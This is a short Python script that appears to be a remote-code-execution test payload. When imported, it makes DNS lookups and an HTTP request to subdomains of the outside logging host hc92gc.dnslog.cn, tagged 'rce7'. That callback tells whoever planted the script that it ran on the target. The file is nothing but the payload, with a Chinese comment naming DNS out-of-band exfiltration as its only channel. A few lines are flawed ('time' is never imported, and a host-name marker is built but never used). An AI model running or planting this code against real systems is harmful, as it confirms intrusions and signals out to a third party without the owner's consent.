import os, subprocess, base64, sys, socket
def _run():
    # 只做 DNS 外带 (唯一验证通道)
    try:
        socket.setdefaulttimeout(5)
        marker = "RCE7_" + (os.uname().nodename if hasattr(os, 'uname') else "host")
        import hashlib
        h = hashlib.md5(str(time.time()).encode()).hexdigest()[:6] if 'time' in dir() else "x"
        socket.gethostbyname("rce7-" + h + ".hc92gc.dnslog.cn")
        socket.gethostbyname("rce7b-" + h + ".hc92gc.dnslog.cn")
    except Exception:
        pass
    try:
        import urllib.request as u
        u.urlopen("http://hc92gc.dnslog.cn/rce7-" + h, timeout=5)
    except Exception:
        pass
_run()
